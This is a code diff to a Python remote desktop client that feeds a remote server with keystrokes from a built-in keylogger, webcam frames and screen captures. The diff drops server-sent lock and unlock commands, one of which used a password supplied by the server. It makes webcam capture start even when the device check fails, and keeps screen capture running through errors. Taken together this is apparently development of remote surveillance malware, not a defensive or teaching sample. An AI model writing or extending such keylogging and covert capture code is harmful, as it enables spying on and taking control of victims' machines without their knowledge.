@@ -88,7 +88,6 @@ from common.protocol import FrameEncoder, ProtocolHandler, MessageType
 from common.keylogger import KeyLogger, is_machine_locked
 from common.webcam_capture import WebcamCapture
 from common.control_mode import ControlMode
-from common.lock_detector import LockDetector
 
 # Check if OpenCV is available for webcam
 try:
@@ -142,12 +141,10 @@ class RemoteDesktopClient:
         self.keylogger = KeyLogger(callback=self._on_keylog, device_name=self.pc_name)
         self.webcam = WebcamCapture(callback=self._on_webcam_frame)
         self.control_mode = ControlMode(input_callback=self._on_control_input)
-        self.lock_detector = LockDetector()
         self.webcam_active = False
         self.control_active = False
         self.current_display = 0  # 0 = all displays, 1+ = specific display
-        self.last_lock_state = False
-        self.lock_check_interval = 5  # Check lock state every 5 seconds
+        self.last_frame_dimensions = (1920, 1080)  # Store last known frame dimensions
     
     def _get_display_count(self) -> int:
         """Get number of displays available"""
@@ -159,7 +156,7 @@ class RemoteDesktopClient:
         except Exception as e:
             logger.warning(f"Failed to get display count: {e}")
             return 1  # Default to 1 display
-        
+    
     def create_ssl_context(self) -> Optional[ssl.SSLContext]:
         """Create SSL context for secure connection"""
         # Try embedded certificates first
@@ -333,37 +330,49 @@ class RemoteDesktopClient:
             await self._handle_control_input(msg_data)
         elif msg_type == MessageType.DISPLAY_SELECT:
             await self._handle_display_select(msg_data)
-        elif msg_type == MessageType.UNLOCK_REQUEST:
-            await self._handle_unlock_request(msg_data)
-        elif msg_type == MessageType.LOCK_REQUEST:
-            await self._handle_lock_request(msg_data)
     
     async def _handle_webcam_start(self):
         """Handle webcam start request"""
-        logger.info("Received WEBCAM_START request from server")
+        logger.info("=== Received WEBCAM_START request from server ===")
+        print("=== Received WEBCAM_START request from server ===")
         try:
             # Check if OpenCV is available first
             if not CV2_AVAILABLE:
                 error_msg = "OpenCV not installed - webcam not available"
-                await self._send_webcam_error(error_msg)
                 logger.warning(f"Webcam start requested but OpenCV not available - sent error: {error_msg}")
+                print(f"ERROR: {error_msg}")
+                await self._send_webcam_error(error_msg)
                 return
             
-            # Check if webcam device exists
-            if not self.webcam.is_available():
-                error_msg = "No webcam device found"
-                await self._send_webcam_error(error_msg)
-                logger.warning(f"Webcam start requested but no webcam device found - sent error: {error_msg}")
-                return
+            # Check if webcam device exists (but don't fail if check fails - try anyway)
+            try:
+                is_avail = self.webcam.is_available()
+                logger.info(f"Webcam availability check: {is_avail}")
+                if not is_avail:
+                    logger.warning("Webcam availability check failed, but trying to start anyway...")
+            except Exception as avail_err:
+                logger.warning(f"Webcam availability check error (continuing anyway): {avail_err}")
             
             if not self.webcam_active:
+                logger.info("Starting webcam capture...")
                 self.webcam.start()
+                # Wait a bit to see if webcam starts successfully
+                import asyncio
+                await asyncio.sleep(0.5)
                 self.webcam_active = True
                 logger.info("Webcam started successfully")
+                print("Webcam started successfully")
+            else:
+                logger.info("Webcam already active")
         except Exception as e:
             error_msg = str(e)
             logger.error(f"Error starting webcam: {error_msg}")
+            print(f"ERROR starting webcam: {error_msg}")
+            import traceback
+            logger.error(traceback.format_exc())
             await self._send_webcam_error(error_msg)
+            # Reset state on error
+            self.webcam_active = False
     
     async def _handle_webcam_stop(self):
         """Handle webcam stop request"""
@@ -597,132 +606,6 @@ class RemoteDesktopClient:
             import traceback
             logger.error(traceback.format_exc())
     
-    async def _handle_unlock_request(self, msg_data: bytes):
-        """Handle unlock request from server"""
-        try:
-            import json
-            data = json.loads(msg_data.decode('utf-8'))
-            password = data.get('password', '')
-            
-            logger.info("=== UNLOCK REQUEST RECEIVED ===")
-            
-            if not password:
-                logger.warning("Unlock request received but no password provided")
-                return
-            
-            # Attempt to unlock
-            success, message = self.lock_detector.unlock(password)
-            
-            logger.info(f"Unlock result: {success}, message: {message}")
-            
-            # Send result back to server (as error message for now)
-            if not success:
-                await self._send_unlock_result(False, message)
-            else:
-                await self._send_unlock_result(True, message)
-                # Update lock state immediately
-                self.last_lock_state = False
-                await self._send_lock_status(False, 'standard')
-            
-        except Exception as e:
-            logger.error(f"Error handling unlock request: {e}")
-            import traceback
-            logger.error(traceback.format_exc())
-    
-    async def _handle_lock_request(self, msg_data: bytes):
-        """Handle lock request from server"""
-        try:
-            logger.info("=== LOCK REQUEST RECEIVED ===")
-            
-            # Attempt to lock
-            success, message = self.lock_detector.lock()
-            
-            logger.info(f"Lock result: {success}, message: {message}")
-            
-            # Send result back to server
-            await self._send_lock_result(success, message)
-            
-            # Update lock state immediately if successful
-            if success:
-                self.last_lock_state = True
-                await self._send_lock_status(True, 'standard')
-            
-        except Exception as e:
-            logger.error(f"Error handling lock request: {e}")
-            import traceback
-            logger.error(traceback.format_exc())
-    
-    async def _send_unlock_result(self, success: bool, message: str):
-        """Send unlock result to server"""
-        if not self.writer:
-            return
-        
-        try:
-            import json
-            result_msg = json.dumps({
-                'success': success,
-                'message': message
-            }).encode('utf-8')
-            
-            # Send as error message with special prefix
-            full_msg = f"UNLOCK_RESULT:{message}".encode('utf-8')
-            msg = ProtocolHandler.create_error(full_msg.decode('utf-8'))
-            
-            self.writer.write(len(msg).to_bytes(4, 'big'))
-            self.writer.write(msg)
-            await self.writer.drain()
-            logger.info(f"Sent unlock result to server: {success}")
-        except Exception as e:
-            logger.error(f"Error sending unlock result: {e}")
-    
-    async def _send_lock_result(self, success: bool, message: str):
-        """Send lock result to server"""
-        if not self.writer:
-            return
-        
-        try:
-            # Send as error message with special prefix (similar to unlock)
-            full_msg = f"LOCK_RESULT:{message}".encode('utf-8')
-            msg = ProtocolHandler.create_error(full_msg.decode('utf-8'))
-            
-            self.writer.write(len(msg).to_bytes(4, 'big'))
-            self.writer.write(msg)
-            await self.writer.drain()
-            logger.info(f"Sent lock result to server: {success}")
-        except Exception as e:
-            logger.error(f"Error sending lock result: {e}")
-    
-    async def _send_lock_status(self, is_locked: bool, lock_type: str):
-        """Send lock status to server"""
-        if not self.writer:
-            return
-        
-        try:
-            msg = ProtocolHandler.create_lock_status(is_locked, lock_type)
-            self.writer.write(len(msg).to_bytes(4, 'big'))
-            self.writer.write(msg)
-            await self.writer.drain()
-            logger.debug(f"Sent lock status: locked={is_locked}, type={lock_type}")
-        except Exception as e:
-            logger.error(f"Error sending lock status: {e}")
-    
-    async def check_lock_state_periodically(self):
-        """Periodically check and report lock state"""
-        while self.running:
-            try:
-                is_locked, lock_type = self.lock_detector.is_locked()
-                
-                # Only send if state changed
-                if is_locked != self.last_lock_state:
-                    logger.info(f"Lock state changed: {is_locked} (type: {lock_type})")
-                    await self._send_lock_status(is_locked, lock_type)
-                    self.last_lock_state = is_locked
-                
-                await asyncio.sleep(self.lock_check_interval)
-            except Exception as e:
-                logger.error(f"Error checking lock state: {e}")
-                await asyncio.sleep(self.lock_check_interval)
-    
     def _on_keylog(self, log_content: str):
         """Callback for keylogger - receives full log content every 3 minutes"""
         logger.info(f"Keylog callback triggered with {len(log_content)} characters")
@@ -920,36 +803,40 @@ class RemoteDesktopClient:
                         # Fallback to full screen capture
                         if delta_failures >= max_delta_failures:
                             logger.warning("Delta capture failed multiple times, using full screen capture")
-                        frame_data = self.capture.capture_full_screen()
-                        frame_id = self.capture.get_frame_id()
-                        await self.send_frame(frame_data, frame_id)
-                        delta_failures = 0  # Reset on success
                         
-                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
-                    # Connection lost - will be handled by outer loop
-                    logger.warning(f"Connection lost during capture: {conn_err}")
-                    self.writer = None
-                    raise
-                except Exception as capture_error:
-                    delta_failures += 1
-                    if delta_failures < max_delta_failures:
-                        logger.warning(f"Capture error (attempt {delta_failures}/{max_delta_failures}): {capture_error}")
-                        # Try full screen as fallback
+                        # Normal capture
                         try:
                             frame_data = self.capture.capture_full_screen()
                             frame_id = self.capture.get_frame_id()
+                            # Update dimensions if capture succeeded
+                            if hasattr(self.capture, 'width') and hasattr(self.capture, 'height'):
+                                self.last_frame_dimensions = (self.capture.width, self.capture.height)
                             await self.send_frame(frame_data, frame_id)
-                            delta_failures = 0
+                            delta_failures = 0  # Reset on success
                         except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
-                            logger.warning(f"Connection lost during fallback: {conn_err}")
+                            # Connection lost - will be handled by outer loop
+                            logger.warning(f"Connection lost during capture: {conn_err}")
                             self.writer = None
                             raise
-                        except Exception as fallback_error:
-                            logger.error(f"Full screen capture also failed: {fallback_error}")
-                            raise
-                    else:
-                        # Too many failures, re-raise
-                        raise
+                        except Exception as capture_err:
+                            # Log error and continue - don't break the loop
+                            logger.warning(f"Capture failed: {capture_err}")
+                            delta_failures += 1
+                            await asyncio.sleep(frame_interval)
+                            continue
+                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
+                    # Connection errors - re-raise to outer handler
+                    logger.warning(f"Connection lost: {conn_err}")
+                    self.writer = None
+                    raise
+                except Exception as e:
+                    # Log other errors but continue the loop
+                    logger.error(f"Unexpected error in capture loop: {e}")
+                    import traceback
+                    logger.debug(traceback.format_exc())
+                    delta_failures += 1
+                    await asyncio.sleep(frame_interval)
+                    continue
                 
                 # Calculate sleep time to maintain FPS
                 elapsed = asyncio.get_event_loop().time() - start_time
@@ -984,8 +871,10 @@ class RemoteDesktopClient:
         logger.info("Screen capture initialized")
         if CAPTURE_ALL_DISPLAYS:
             logger.info(f"Capturing all displays: {self.capture.width}x{self.capture.height}")
+            self.last_frame_dimensions = (self.capture.width, self.capture.height)
         else:
             logger.info(f"Capturing primary monitor: {self.capture.width}x{self.capture.height}")
+            self.last_frame_dimensions = (self.capture.width, self.capture.height)
         
         while True:
             try:
@@ -1002,7 +891,6 @@ class RemoteDesktopClient:
                     message_task = asyncio.create_task(self.handle_messages())
                     
                     # Start lock state checker
-                    lock_task = asyncio.create_task(self.check_lock_state_periodically())
                     
                     # Start capture loop
                     try:
